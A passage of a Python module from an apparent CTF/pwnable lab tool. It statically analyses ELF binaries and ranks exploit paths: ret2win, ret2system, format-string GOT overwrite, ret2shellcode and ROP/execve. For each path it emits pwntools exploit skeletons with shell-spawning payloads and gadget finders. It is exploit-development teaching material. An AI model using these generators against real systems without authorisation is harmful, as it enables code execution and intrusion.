"""근거 기반 exploit 전략 추천과 pwntools 스켈레톤 초안.

이 모듈은 checksec, 위험 API 스캔, 함수/심볼, 문자열, ROP gadget 근거를 종합해
"이 바이너리를 어떤 루트로 풀 수 있는가"를 후보 경로(attack path)로 제시한다.

취약점을 확정하지 않는다. 모든 경로는 ``recommended``/``possible``/``blocked``
상태와 confidence, 근거, 선행 조건, 차단 요인을 함께 제공하며, 생성되는 pwntools
스켈레톤은 사용자가 오프셋과 주소를 직접 검증해야 하는 초안이다. 업로드한
바이너리는 실행하지 않는다.
"""

from __future__ import annotations

import re
from dataclasses import asdict, dataclass, field

from pwnable_lab.analyzer.checksec import Checksec, run_checksec
from pwnable_lab.analyzer.gadgets import Gadget, scan_gadgets
from pwnable_lab.analyzer.got_plt import analyze_got_plt
from pwnable_lab.analyzer.strings import extract_strings
from pwnable_lab.analyzer.vuln_scan import CallSite, Finding, scan_vulns
from pwnable_lab.elf.parser import ElfImage

# 로컬 "win"/셸 함수 후보로 볼 이름 조각 (libc 심볼과 구분하기 위해 로컬 정의만 사용).
# 강한 힌트(셸/플래그 의미가 뚜렷)는 약한 힌트보다 우선 선택된다.
_WIN_NAME_HINTS_STRONG = (
    "win",
    "flag",
    "shell",
    "backdoor",
    "getshell",
    "get_shell",
    "give_shell",
    "giveshell",
    "print_flag",
    "read_flag",
    "cat_flag",
    "callme",
)
_WIN_NAME_HINTS_WEAK = (
    "spawn",
    "magic",
    "secret",
    "admin",
    "system_call",
)
_WIN_NAME_HINTS = _WIN_NAME_HINTS_STRONG + _WIN_NAME_HINTS_WEAK
# 오프셋(입력 버퍼)이 저장되는 인자 레지스터를 함수별로 지정.
_BUFFER_ARGUMENT = {
    "gets": ("rdi", "stack_arg_0"),
    "fgets": ("rdi", "stack_arg_0"),
    "scanf": ("rsi", "stack_arg_1"),
    "sscanf": ("rdx", "stack_arg_2"),
    "read": ("rsi", "stack_arg_1"),
    "recv": ("rsi", "stack_arg_1"),
    "strcpy": ("rdi", "stack_arg_0"),
    "strcat": ("rdi", "stack_arg_0"),
    "memcpy": ("rdi", "stack_arg_0"),
    "sprintf": ("rdi", "stack_arg_0"),
}
_OVERFLOW_SYMBOLS = set(_BUFFER_ARGUMENT)
_RBP_DISP = re.compile(r"rbp\s*-\s*(0x[0-9a-fA-F]+|\d+)")
# `lea <reg>, [rbp - <disp>]` — gcc 가 버퍼 주소를 인자 레지스터에 실을 때의 관용구.
_LEA_RBP = re.compile(r"lea\s+(\w+)\s*,\s*\[\s*rbp\s*-\s*(0x[0-9a-fA-F]+|\d+)")


def _is_clean_ret(instruction: str) -> bool:
    """체인에 안전한 종단인지 — bare ``ret`` 또는 ``ret 0`` 만 참.

    ``ret <nonzero imm>``(0xC2, 예: ``ret 0x349``)은 반환 후 rsp 를 imm 만큼 추가로
    올려 뒤따르는 체인 워드를 어긋나게 하므로 배제한다. 정적 glibc 등에는 이런
    ``ret imm`` 종단 가젯이 흔해, 이를 걸러내지 않으면 조용히 깨진 체인을 만든다.
    """

    text = instruction.strip().lower()
    if text == "ret":
        return True
    parts = text.split()
    if len(parts) == 2 and parts[0] == "ret":
        try:
            return int(parts[1], 0) == 0
        except ValueError:
            return False
    return False


@dataclass
class Primitive:
    """공격에 필요한 1차 재료 하나의 유무와 근거."""

    key: str
    label: str
    present: bool
    detail: str
    evidence: list[str] = field(default_factory=list)


@dataclass
class Precondition:
    label: str
    met: bool
    detail: str


@dataclass
class AttackPath:
    id: str
    title: str
    korean_title: str
    status: str  # recommended | possible | blocked
    confidence: float
    summary: str
    preconditions: list[Precondition]
    steps: list[str]
    evidence: list[str]
    blockers: list[str]
    pwntools: str


def analyze_strategy(image: ElfImage, *, max_instructions: int = 20_000) -> dict:
    """공격 표면 근거를 종합해 후보 exploit 경로를 반환한다."""

    checksec = run_checksec(image)
    findings = scan_vulns(image, max_instructions=max_instructions)
    strings = extract_strings(image.data, min_length=3, max_strings=20_000)
    got_plt = analyze_got_plt(image)
    try:
        gadget_scan = scan_gadgets(image, max_gadgets=2000, max_depth=5)
        gadgets = gadget_scan.gadgets
    except Exception:  # noqa: BLE001 - gadget scan is best-effort context here
        gadgets = []

    bits = image.bits or 64
    context = _Context(
        image=image,
        bits=bits,
        checksec=checksec,
        findings=findings,
        string_values={s.value for s in strings},
        plt_symbols={entry.symbol for entry in got_plt.plt_entries if entry.symbol},
        got_symbols={entry.symbol for entry in got_plt.got_entries if entry.symbol},
        gadgets=gadgets,
        binary_name=_binary_name(image),
    )

    primitives = _detect_primitives(context)
    paths = _build_paths(context, primitives)
    paths.sort(key=lambda path: (-path.confidence, path.id))

    recommended = next(
        (path.id for path in paths if path.status == "recommended"),
        paths[0].id if paths else None,
    )

    return {
        "format": "ELF",
        "machine": image.machine,
        "bits": bits,
        "position_independent": image.e_type == "ET_DYN",
        "protections": {
            "nx": checksec.nx,
            "canary": checksec.canary,
            "pie": checksec.pie,
            "relro": checksec.relro,
            "fortify": checksec.fortify,
            "executable_stack": checksec.executable_stack,
        },
        "primitives": [asdict(primitive) for primitive in primitives],
        "paths": [asdict(path) for path in paths],
        "recommended_path_id": recommended,
        "verification": "inferred",
        "confidence": round(max((path.confidence for path in paths), default=0.2), 2),
        "disclaimer": (
            "후보 경로와 pwntools 초안은 정적 근거 기반 추론입니다. 오프셋과 주소는 "
            "cyclic/디버거로 반드시 검증하세요. 취약점을 확정하지 않습니다."
        ),
        "limitations": [
            "실제 실행/디버깅 없이 정적 근거만 사용합니다.",
            "오프셋은 스택 프레임과 버퍼 인자에서 추정하며 정확하지 않을 수 있습니다.",
            "libc 주소, ASLR 우회, 원격 leak 흐름은 이 초안에 포함되지 않습니다.",
        ],
    }


@dataclass
class _Context:
    image: ElfImage
    bits: int
    checksec: Checksec
    findings: list[Finding]
    string_values: set[str]
    plt_symbols: set[str]
    got_symbols: set[str]
    gadgets: list[Gadget]
    binary_name: str

    def finding(self, symbol: str) -> Finding | None:
        return next((f for f in self.findings if f.symbol == symbol), None)

    def has_string(self, needle: str) -> bool:
        return any(needle in value for value in self.string_values)

    def has_symbol(self, name: str) -> bool:
        return name in self.plt_symbols or any(
            symbol.name == name
            for symbol in self.image.symbols + self.image.dynamic_symbols
        )


def _binary_name(image: ElfImage) -> str:
    return "./target"


def _win_functions(image: ElfImage) -> list[tuple[str, int]]:
    seen: dict[str, int] = {}
    for symbol in image.symbols + image.dynamic_symbols:
        if not symbol.defined or symbol.stype != "STT_FUNC" or not symbol.addr:
            continue
        lowered = symbol.name.lower()
        if any(hint in lowered for hint in _WIN_NAME_HINTS):
            seen.setdefault(symbol.name, symbol.addr)

    def _rank(name: str) -> int:
        lowered = name.lower()
        if any(hint in lowered for hint in _WIN_NAME_HINTS_STRONG):
            return 0
        return 1

    # 강한 힌트를 먼저, 같은 티어 안에서는 주소순으로 정렬한다.
    return sorted(seen.items(), key=lambda item: (_rank(item[0]), item[1]))


def _find_gadget(context: _Context, pattern: list[str]) -> Gadget | None:
    normalized = [item.strip().lower() for item in pattern]
    for gadget in context.gadgets:
        body = [text.strip().lower() for text in gadget.instructions]
        if body == normalized:
            return gadget
    # ``pop rdi ; ret`` 을 정확히 못 찾으면 pop rdi 로 시작하는 최단 gadget 을 허용하되
    # 종단이 **클린 ret** 인 것만(``ret imm`` 종단은 rsp 를 어긋나게 하므로 배제).
    if normalized and normalized[0].startswith("pop"):
        candidates = [
            gadget
            for gadget in context.gadgets
            if gadget.instructions
            and gadget.instructions[0].strip().lower() == normalized[0]
            and _is_clean_ret(gadget.instructions[-1])
        ]
        candidates.sort(key=lambda gadget: len(gadget.instructions))
        if candidates:
            return candidates[0]
    return None


def _overflow_call_sites(context: _Context) -> list[tuple[str, CallSite]]:
    sites: list[tuple[str, CallSite]] = []
    for finding in context.findings:
        if finding.symbol not in _OVERFLOW_SYMBOLS:
            continue
        for site in finding.call_sites:
            sites.append((finding.symbol, site))
    return sites


def _infer_offset(context: _Context) -> tuple[int | None, str, str | None]:
    """오프셋(저장된 반환 주소까지)을 근거와 함께 추정한다."""

    word = 8 if context.bits == 64 else 4
    best: int | None = None
    evidence: str | None = None
    for symbol, site in _overflow_call_sites(context):
        reg64, reg32 = _BUFFER_ARGUMENT.get(symbol, ("rdi", "stack_arg_0"))
        buffer_expr = site.arguments.get(reg64 if context.bits == 64 else reg32)
        disp = _buffer_rbp_disp(buffer_expr, site.surrounding_disassembly)
        if disp is None:
            continue
        candidate = disp + word  # saved rbp 이후가 반환 주소.
        if best is None or candidate > best:
            best = candidate
            evidence = (
                f"{symbol}() 버퍼가 [rbp - 0x{disp:x}] 에 위치 → 오프셋 ≈ "
                f"0x{disp:x} + {word}(saved rbp) = {candidate}"
            )
    if best is not None:
        return best, "inferred", evidence
    return None, "unknown", None


def _buffer_rbp_disp(buffer_expr: str | None, surrounding: list[str]) -> int | None:
    """오버플로 버퍼가 위치한 ``[rbp - disp]`` 의 disp 를 구한다.

    1. 인자값이 메모리식(``[rbp - N]``)이면 직접 파싱한다.
    2. 인자값이 레지스터명이면, **그 레지스터**를 ``lea reg, [rbp - N]`` 로 적재하는
       주변 명령을 찾아 disp 를 구한다. gcc 는 보통 ``lea rax, [rbp - N]; mov rdi, rax``
       처럼 버퍼 주소를 간접 전달하므로 인자값이 ``rax`` 같은 레지스터로만 기록된다.
       이 경우가 이전 구현이 오프셋 추론에 실패하던 지점이다.
    3. 위가 모두 실패하면 주변 window 의 첫 rbp 변위를 폴백으로 쓴다.
    """
    if buffer_expr:
        direct = _RBP_DISP.search(buffer_expr)
        if direct:
            return int(direct.group(1), 0)
        register = buffer_expr.strip().lower()
        if register.isalnum():
            for line in surrounding:
                lea = _LEA_RBP.search(line)
                if lea and lea.group(1).lower() == register:
                    return int(lea.group(2), 0)
    fallback = _RBP_DISP.search(" ; ".join(surrounding))
    return int(fallback.group(1), 0) if fallback else None


def _detect_primitives(context: _Context) -> list[Primitive]:
    checksec = context.checksec
    overflow_sites = _overflow_call_sites(context)
    win = _win_functions(context.image)
    pop_rdi = _find_gadget(context, ["pop rdi", "ret"])
    has_binsh = context.has_string("/bin/sh") or context.has_string("/bin/bash")
    has_system = "system" in context.plt_symbols or context.has_symbol("system")
    fmt = next(
        (f for f in context.findings if f.category == "format-string" and f.call_sites),
        None,
    )

    return [
        Primitive(
            key="stack_overflow",
            label="스택 버퍼 오버플로 입력",
            present=bool(overflow_sites),
            detail=(
                "; ".join(sorted({symbol for symbol, _ in overflow_sites}))
                or "길이 무제한 입력 함수의 직접 호출을 찾지 못했습니다."
            ),
            evidence=[
                f"{symbol} 직접 호출 @ 0x{site.address:x}"
                for symbol, site in overflow_sites
            ],
        ),
        Primitive(
            key="win_function",
            label="이미 존재하는 win/셸 함수",
            present=bool(win),
            detail=(
                ", ".join(f"{name}@0x{addr:x}" for name, addr in win)
                or "이름 기반 win/셸 후보 함수가 없습니다."
            ),
            evidence=[f"심볼 {name} @ 0x{addr:x}" for name, addr in win],
        ),
        Primitive(
            key="binsh_string",
            label='"/bin/sh" 문자열',
            present=has_binsh,
            detail=(
                "바이너리 내부에 셸 경로 문자열이 존재합니다."
                if has_binsh
                else "셸 경로 문자열이 없습니다."
            ),
            evidence=['"/bin/sh" 문자열 발견'] if has_binsh else [],
        ),
        Primitive(
            key="system_plt",
            label="system() 호출 가능",
            present=has_system,
            detail=(
                "PLT/심볼에 system 이 있어 ret2plt 이 가능합니다."
                if has_system
                else "system 심볼이 없습니다."
            ),
            evidence=["PLT/심볼에 system 존재"] if has_system else [],
        ),
        Primitive(
            key="pop_rdi_gadget",
            label="pop rdi ; ret gadget (amd64 인자 제어)",
            present=pop_rdi is not None,
            detail=(
                f"pop rdi gadget @ 0x{pop_rdi.address:x}"
                if pop_rdi
                else "pop rdi gadget 미발견"
            ),
            evidence=(
                [f"gadget @ 0x{pop_rdi.address:x}: {' ; '.join(pop_rdi.instructions)}"]
                if pop_rdi
                else []
            ),
        ),
        Primitive(
            key="format_string",
            label="사용자 제어 포맷 스트링",
            present=fmt is not None,
            detail=(
                f"{fmt.symbol}() 포맷 인자 제어 가능성"
                if fmt
                else "포맷 스트링 후보가 없습니다."
            ),
            evidence=(
                [f"{fmt.symbol} 직접 호출 @ 0x{s.address:x}" for s in fmt.call_sites]
                if fmt
                else []
            ),
        ),
        Primitive(
            key="executable_stack",
            label="실행 가능한 스택 (NX 해제)",
            present=checksec.nx is False or checksec.executable_stack is True,
            detail=(
                "NX 가 꺼져 있어 스택 셸코드 실행이 가능할 수 있습니다."
                if (checksec.nx is False or checksec.executable_stack is True)
                else "NX 가 활성화되어 스택 실행이 차단됩니다."
            ),
            evidence=(
                ["GNU_STACK 실행 권한 또는 NX 해제"] if checksec.nx is False else []
            ),
        ),
    ]


def _prim(primitives: list[Primitive], key: str) -> Primitive:
    return next(p for p in primitives if p.key == key)


def _build_paths(context: _Context, primitives: list[Primitive]) -> list[AttackPath]:
    checksec = context.checksec
    offset, offset_verification, offset_evidence = _infer_offset(context)
    win = _win_functions(context.image)
    pop_rdi = _find_gadget(context, ["pop rdi", "ret"])
    ret_gadget = _find_gadget(context, ["ret"])
    canary_blocks = checksec.canary is True
    overflow = _prim(primitives, "stack_overflow").present

    paths: list[AttackPath] = []
    offset_note = _offset_note(offset, offset_verification, offset_evidence)

    # 1) ret2win: 오버플로 + 로컬 win 함수 + 카나리 없음.
    if win:
        blockers = []
        if not overflow:
            blockers.append(
                "오버플로 입력 primitive 를 아직 못 찾았습니다 (수동 확인 필요)."
            )
        if canary_blocks:
            blockers.append(
                "스택 카나리가 있어 반환 주소 덮어쓰기 전에 카나리 우회가 필요합니다."
            )
        status = "recommended" if overflow and not canary_blocks else "possible"
        confidence = 0.9 if status == "recommended" else 0.55
        win_name, win_addr = win[0]
        paths.append(
            AttackPath(
                id="ret2win",
                title="Return-to-win (overwrite saved RIP → win function)",
                korean_title="ret2win — 반환 주소를 win 함수로 덮어쓰기",
                status=status,
                confidence=confidence,
                summary=(
                    f"오버플로로 저장된 반환 주소를 로컬 함수 {win_name}(0x{win_addr:x}) 로 "
                    "바꿔 플래그/셸을 직접 얻는 가장 전형적인 루트입니다."
                ),
                preconditions=[
                    Precondition(
                        "스택 오버플로 입력",
                        overflow,
                        _prim(primitives, "stack_overflow").detail,
                    ),
                    Precondition(
                        "win/셸 함수 존재", True, f"{win_name} @ 0x{win_addr:x}"
                    ),
                    Precondition(
                        "카나리 없음",
                        not canary_blocks,
                        checksec.canary and "canary 감지" or "canary 미검출",
                    ),
                ],
                steps=[
                    "입력 지점(gets/read/scanf)에서 버퍼 크기를 확인한다.",
                    "cyclic 패턴으로 저장된 반환 주소까지의 정확한 오프셋을 구한다.",
                    f"payload = b'A'*offset + p{context.bits}({win_name}_addr) 형태로 구성한다.",
                    "amd64 는 호출 전 스택 16바이트 정렬을 위해 ret gadget 을 한 번 끼운다.",
                    "로컬에서 성공하면 원격에 그대로 전송한다.",
                ],
                evidence=[
                    *_prim(primitives, "stack_overflow").evidence,
                    f"win 심볼 {win_name} @ 0x{win_addr:x}",
                ],
                blockers=blockers,
                pwntools=_skeleton_ret2win(
                    context, offset, offset_note, win_name, win_addr, ret_gadget
                ),
            )
        )

    # 2) ret2system("/bin/sh") — system + /bin/sh + 오버플로.
    has_system = _prim(primitives, "system_plt").present
    has_binsh = _prim(primitives, "binsh_string").present
    if has_system and has_binsh:
        blockers = []
        if not overflow:
            blockers.append("오버플로 입력 primitive 를 아직 못 찾았습니다.")
        if canary_blocks:
            blockers.append("카나리 우회가 필요합니다.")
        if context.bits == 64 and pop_rdi is None:
            blockers.append("amd64 에서 rdi 인자 제어용 pop rdi gadget 이 필요합니다.")
        status = (
            "recommended"
            if overflow and not canary_blocks and (context.bits == 32 or pop_rdi)
            else "possible"
        )
        paths.append(
            AttackPath(
                id="ret2system",
                title='Return-to-system → system("/bin/sh")',
                korean_title='ret2system — system("/bin/sh") 호출로 셸 획득',
                status=status,
                confidence=0.82 if status == "recommended" else 0.5,
                summary=(
                    '바이너리에 system 과 "/bin/sh" 문자열이 모두 있어, 반환 주소를 system 으로 '
                    "돌리고 인자로 /bin/sh 를 넘겨 셸을 얻습니다."
                ),
                preconditions=[
                    Precondition(
                        "스택 오버플로",
                        overflow,
                        _prim(primitives, "stack_overflow").detail,
                    ),
                    Precondition("system() 사용 가능", True, "PLT/심볼에 system"),
                    Precondition('"/bin/sh" 문자열', True, "문자열 테이블에 존재"),
                    Precondition(
                        "인자 제어(amd64: pop rdi)",
                        context.bits == 32 or pop_rdi is not None,
                        (
                            f"pop rdi @ 0x{pop_rdi.address:x}"
                            if pop_rdi
                            else "32-bit 는 스택 인자"
                        ),
                    ),
                ],
                steps=[
                    "오프셋을 cyclic 으로 확정한다.",
                    "elf.plt['system'] 와 next(elf.search(b'/bin/sh')) 로 주소를 얻는다.",
                    "amd64: pop rdi ; ret 로 rdi=/bin/sh 세팅 후 system 호출.",
                    "i386: [system][ret][/bin/sh] 순으로 스택을 구성.",
                ],
                evidence=[
                    *_prim(primitives, "system_plt").evidence,
                    *_prim(primitives, "binsh_string").evidence,
                    *_prim(primitives, "pop_rdi_gadget").evidence,
                ],
                blockers=blockers,
                pwntools=_skeleton_ret2system(
                    context, offset, offset_note, pop_rdi, ret_gadget
                ),
            )
        )

    # 3) format string — printf 계열 포맷 제어.
    fmt = _prim(primitives, "format_string")
    fmt_finding = next(
        (f for f in context.findings if f.category == "format-string" and f.call_sites),
        None,
    )
    fmt_symbol = fmt_finding.symbol if fmt_finding else "printf"
    if fmt.present:
        paths.append(
            AttackPath(
                id="format_string",
                title="Format-string write/leak (%n / %p)",
                korean_title="포맷 스트링 — %p 누출 & %n 임의 쓰기",
                status="possible",
                confidence=0.5,
                summary=(
                    "사용자 입력이 printf 계열의 포맷 인자로 그대로 전달되면 스택 leak(%p) 과 "
                    "GOT 덮어쓰기(%n) 가 가능합니다."
                ),
                preconditions=[
                    Precondition("포맷 인자 사용자 제어", True, fmt.detail),
                    Precondition(
                        "Partial RELRO 이하(GOT 쓰기)",
                        checksec.relro != "full",
                        f"RELRO={checksec.relro}",
                    ),
                ],
                steps=[
                    "%p 를 반복 전송해 입력이 스택 몇 번째 인자에 오는지(offset) 찾는다.",
                    "leak 으로 libc/PIE 베이스를 복구한다.",
                    "fmtstr_payload(offset, {elf.got['printf']: target}) 로 GOT 를 덮는다.",
                    "덮은 함수가 다시 호출되면 target 으로 흐름이 넘어간다.",
                ],
                evidence=fmt.evidence,
                blockers=(
                    ["Full RELRO 이면 GOT 쓰기가 막혀 leak 위주로 활용합니다."]
                    if checksec.relro == "full"
                    else []
                ),
                pwntools=_skeleton_format_string(context, fmt_symbol),
            )
        )

    # 4) ret2shellcode — NX 해제 + 오버플로.
    if _prim(primitives, "executable_stack").present and overflow:
        paths.append(
            AttackPath(
                id="ret2shellcode",
                title="Return-to-shellcode (executable stack)",
                korean_title="ret2shellcode — 스택에 셸코드 주입 후 실행",
                status="possible" if checksec.pie == "PIE" else "recommended",
                confidence=0.6 if checksec.pie != "PIE" else 0.4,
                summary=(
                    "NX 가 꺼져 있어 스택에 셸코드를 올리고 반환 주소를 버퍼로 돌려 실행할 수 "
                    "있습니다. 버퍼의 정적 주소(비 PIE)가 있으면 특히 간단합니다."
                ),
                preconditions=[
                    Precondition("실행 가능한 스택", True, "NX 해제/GNU_STACK 실행"),
                    Precondition(
                        "버퍼 주소 예측 가능(비 PIE)",
                        checksec.pie != "PIE",
                        f"PIE={checksec.pie}",
                    ),
                ],
                steps=[
                    "오프셋과 버퍼의 런타임 주소를 구한다(비 PIE 면 고정).",
                    "shellcode = asm(shellcraft.sh()) 로 셸코드를 만든다.",
                    "payload = shellcode.ljust(offset, b'A') + p{bits}(buf_addr) 로 구성한다.",
                ],
                evidence=_prim(primitives, "executable_stack").evidence,
                blockers=(
                    ["PIE 라 버퍼 주소를 먼저 leak 해야 합니다."]
                    if checksec.pie == "PIE"
                    else []
                ),
                pwntools=_skeleton_ret2shellcode(context, offset, offset_note),
            )
        )

    # 5) ROP chain — NX 활성 + win/system 없음이지만 gadget 존재.
    if (
        overflow
        and checksec.nx is not False
        and not win
        and not (has_system and has_binsh)
    ):
        paths.append(
            AttackPath(
                id="rop_chain",
                title="ROP chain (execve/syscall or libc)",
                korean_title="ROP 체인 — gadget 으로 syscall/execve 구성",
                status="possible",
                confidence=0.45,
                summary=(
                    "즉시 쓸 win 함수나 system+/bin/sh 조합이 없다면 gadget 을 엮어 "
                    'execve("/bin/sh") syscall 이나 libc 호출 체인을 구성합니다.'
                ),
                preconditions=[
                    Precondition(
                        "스택 오버플로",
                        True,
                        _prim(primitives, "stack_overflow").detail,
                    ),
                    Precondition(
                        "충분한 gadget",
                        bool(context.gadgets),
                        f"{len(context.gadgets)} gadget 스캔됨",
                    ),
                ],
                steps=[
                    "ROP Studio/gadget 목록에서 pop rdi/rsi/rdx/rax, syscall 을 확보한다.",
                    "静的 바이너리면 execve syscall 체인, 동적이면 libc leak 후 one_gadget/system.",
                    "pwntools ROP() 로 체인을 자동 구성하고 정렬을 맞춘다.",
                ],
                evidence=[f"{len(context.gadgets)} gadget 이 스캔되었습니다."],
                blockers=["libc 주소가 필요하면 별도 leak 단계가 선행되어야 합니다."],
                pwntools=_skeleton_rop(context, offset, offset_note),
            )
        )

    if not paths:
        paths.append(
            AttackPath(
                id="recon",
                title="More reconnaissance required",
                korean_title="추가 정찰 필요 — 명확한 루트 미검출",
                status="possible",
                confidence=0.2,
                summary=(
                    "정적 근거만으로는 단일 루트를 특정하기 어렵습니다. 입력 처리 함수와 "
                    "비교/분기 로직을 직접 읽어 취약점을 좁혀야 합니다."
                ),
                preconditions=[],
                steps=[
                    "main 과 사용자 입력을 받는 함수를 Pseudo-C/디스어셈블로 읽는다.",
                    "위험 API(vulns 탭)와 문자열(strings)에서 힌트를 찾는다.",
                    "크래시가 나면 Crash Analyzer 로 오프셋을 복구한다.",
                ],
                evidence=[],
                blockers=[],
                pwntools=_skeleton_generic(context),
            )
        )
    return paths


# --------------------------------------------------------------------------- #
# pwntools 스켈레톤 생성기 (모두 초안 — 사용자가 오프셋/주소 검증 필요)
# --------------------------------------------------------------------------- #


def _offset_note(offset: int | None, verification: str, evidence: str | None) -> str:
    if offset is not None:
        return f"offset = {offset}  # 추정({verification}); {evidence or ''} — cyclic 으로 반드시 검증"
    return "offset = 0  # TODO: cyclic(200) 후 crash 값으로 cyclic_find() 하여 확정"


def _header(context: _Context, arch_comment: str) -> str:
    return (
        "from pwn import *\n\n"
        f"context.binary = elf = ELF('{context.binary_name}')  # {arch_comment}\n"
        "context.log_level = 'info'\n\n"
        "# 로컬 검증: p = process(elf.path)\n"
        "# 원격:     p = remote('HOST', PORT)\n"
        "p = process(elf.path)\n"
    )


def _arch_comment(context: _Context) -> str:
    return "arch=amd64" if context.bits == 64 else "arch=i386"


def _skeleton_ret2win(
    context: _Context,
    offset: int | None,
    offset_note: str,
    win_name: str,
    win_addr: int,
    ret_gadget: Gadget | None,
) -> str:
    body = _header(context, _arch_comment(context)) + "\n" + offset_note + "\n\n"
    body += f"win = elf.symbols.get('{win_name}', {hex(win_addr)})  # {win_name}()\n"
    if context.bits == 64:
        ret_line = (
            f"ret = {hex(ret_gadget.address)}  # 스택 정렬용 ret gadget"
            if ret_gadget
            else "ret = 0x0  # TODO: `ret` gadget 주소 (스택 16바이트 정렬)"
        )
        body += ret_line + "\n\n"
        body += "payload  = b'A' * offset\n"
        body += "payload += p64(ret)   # amd64 movaps 정렬\n"
        body += "payload += p64(win)\n"
    else:
        body += "\npayload  = b'A' * offset\n"
        body += "payload += p32(win)\n"
    body += "\np.sendline(payload)\np.interactive()\n"
    return body


def _skeleton_ret2system(
    context: _Context,
    offset: int | None,
    offset_note: str,
    pop_rdi: Gadget | None,
    ret_gadget: Gadget | None,
) -> str:
    body = _header(context, _arch_comment(context)) + "\n" + offset_note + "\n\n"
    body += "system  = elf.plt.get('system') or elf.symbols['system']\n"
    body += "binsh   = next(elf.search(b'/bin/sh\\x00'))\n\n"
    if context.bits == 64:
        pr = (
            f"pop_rdi = {hex(pop_rdi.address)}  # pop rdi ; ret"
            if pop_rdi
            else "pop_rdi = 0x0  # TODO: pop rdi ; ret gadget"
        )
        rr = (
            f"ret     = {hex(ret_gadget.address)}  # 정렬용 ret"
            if ret_gadget
            else "ret     = 0x0  # TODO: ret gadget"
        )
        body += pr + "\n" + rr + "\n\n"
        body += "payload  = b'A' * offset\n"
        body += "payload += p64(pop_rdi) + p64(binsh)\n"
        body += "payload += p64(ret)\n"
        body += "payload += p64(system)\n"
    else:
        body += "payload  = b'A' * offset\n"
        body += "payload += p32(system)\n"
        body += "payload += p32(0xdeadbeef)  # system 반환 주소(더미)\n"
        body += "payload += p32(binsh)\n"
    body += "\np.sendline(payload)\np.interactive()\n"
    return body


def _skeleton_format_string(context: _Context, fmt_symbol: str = "printf") -> str:
    # 덮어쓸 GOT 항목은 취약 함수 자신을 우선 노린다(재호출 시 흐름 탈취).
    got_target = fmt_symbol if fmt_symbol not in {"sprintf", "snprintf"} else "printf"
    return (
        _header(context, _arch_comment(context)) + "\n"
        f"# 탐지된 포맷 함수: {fmt_symbol}()\n"
        "# 1) 입력이 스택 몇 번째 인자인지 offset 탐색\n"
        "# p.sendline(b'AAAA' + b'.%p' * 10)  → 41414141 이 나오는 위치가 offset\n"
        "fmt_offset = 6  # TODO: 위 방법으로 확정\n\n"
        "# 2) GOT 덮어쓰기 (Partial RELRO 이하)\n"
        "target = elf.symbols.get('win', 0x0)  # 흐름을 넘길 주소\n"
        f"payload = fmtstr_payload(fmt_offset, {{elf.got['{got_target}']: target}})\n\n"
        "p.sendline(payload)\np.interactive()\n"
    )


def _skeleton_ret2shellcode(
    context: _Context, offset: int | None, offset_note: str
) -> str:
    body = _header(context, _arch_comment(context)) + "\n" + offset_note + "\n\n"
    body += (
        "buf_addr = 0x0  # TODO: 셸코드가 놓이는 버퍼의 런타임 주소(비 PIE 면 고정)\n"
    )
    # context.binary 로 arch 가 잡혀 shellcraft.sh() 가 알맞은 셸코드를 만든다.
    body += "shellcode = asm(shellcraft.sh())\n\n"
    body += "payload  = shellcode.ljust(offset, b'A')\n"
    body += f"payload += p{context.bits}(buf_addr)\n"
    body += "\np.sendline(payload)\np.interactive()\n"
    return body


def _skeleton_rop(context: _Context, offset: int | None, offset_note: str) -> str:
    body = _header(context, _arch_comment(context)) + "\n" + offset_note + "\n\n"
    body += "rop = ROP(elf)\n"
    body += "binsh = next(elf.search(b'/bin/sh\\x00'), None)\n"
    body += "# 정적 바이너리: execve 직접 구성 예\n"
    body += "# rop.execve(binsh, 0, 0)   # pwntools 가 gadget 을 자동 배치\n"
    body += "# 동적 바이너리: puts(puts@got) 로 libc leak → system 재구성\n\n"
    body += "payload  = b'A' * offset\n"
    body += "payload += rop.chain()\n"
    body += "\np.sendline(payload)\np.interactive()\n"
    return body


def _skeleton_generic(context: _Context) -> str:
    return (
        _header(context, _arch_comment(context)) + "\n"
        "# 취약점 위치를 좁힌 뒤 위 루트 중 하나를 선택해 payload 를 구성하세요.\n"
        "payload = b'A' * 64  # TODO\n"
        "p.sendline(payload)\np.interactive()\n"
    )


# --- 동적 확정 오프셋 주입 --------------------------------------------------

# 스택 오버플로 오프셋 라인만 매칭한다. `fmt_offset = ...`(포맷스트링 인자
# 인덱스)은 접두사가 달라 매칭되지 않으므로 건드리지 않는다.
_OFFSET_LINE = re.compile(r"^offset = .*$", re.MULTILINE)


def is_pie(image: ElfImage) -> bool:
    """PIE(위치 독립 실행) 여부. ET_DYN 실행파일은 무작위 base 로 로드된다.

    PIE 에서는 심볼/가젯 주소가 **base 상대 오프셋**이라, 절대주소를 전제하는
    자동 익스(ret2win/ret2system/ret2libc)는 PIE base leak 이 선행돼야 성립한다.
    """

    return image.e_type == "ET_DYN"


def ret2win_target(image: ElfImage) -> tuple[str, int] | None:
    """최상위 win/셸 함수 후보 ``(name, addr)`` 를 반환한다(없으면 None).

    non-PIE 에서는 이 주소가 정확한 절대 주소라 곧바로 ret2win 타깃으로 쓸 수
    있다. auto-exploit 자동 검증이 사용한다.
    """

    candidates = _win_functions(image)
    return candidates[0] if candidates else None


def find_ret_gadget(image: ElfImage) -> int | None:
    """실행 가능 섹션에서 단독 ``ret``(0xC3) 바이트의 가상주소를 찾는다.

    amd64 스택 정렬(movaps)용 한 슬롯 패딩 가젯. non-PIE 에서는 그대로 쓸 수 있는
    절대주소다. 없으면 None.
    """

    for section in image.sections:
        if not section.executable or not section.addr or section.size <= 0:
            continue
        blob = image.data[section.offset : section.offset + section.size]
        idx = blob.find(b"\xc3")
        if idx != -1:
            return section.addr + idx
    return None


def find_syscall_gadget(image: ElfImage) -> int | None:
    """실행 가능 섹션에서 ``syscall``(0x0F 0x05) 바이트의 가상주소를 찾는다.

    execve syscall ROP 체인의 종단 가젯. 뒤따르는 명령(보통 ``ret``)은 execve 성공
    시 프로세스가 교체되므로 중요하지 않다 — 순수 ``syscall`` 바이트 위치면 충분하다.
    non-PIE 에서는 그대로 쓸 수 있는 절대주소다. 없으면 None.
    """

    for section in image.sections:
        if not section.executable or not section.addr or section.size <= 0:
            continue
        blob = image.data[section.offset : section.offset + section.size]
        idx = blob.find(b"\x0f\x05")
        if idx != -1:
            return section.addr + idx
    return None


def binary_exec_range(image: ElfImage) -> tuple[int, int] | None:
    """바이너리 자체 실행코드의 가상주소 범위 ``(lo, hi)``. 없으면 None.

    크래시 RIP 가 이 범위 밖(예: libc)에 있으면 제어가 외부 라이브러리 함수로
    이전됐다는 신호다(ret2system 판정에 사용).
    """

    lo = hi = None
    for section in image.sections:
        if not section.executable or not section.addr or section.size <= 0:
            continue
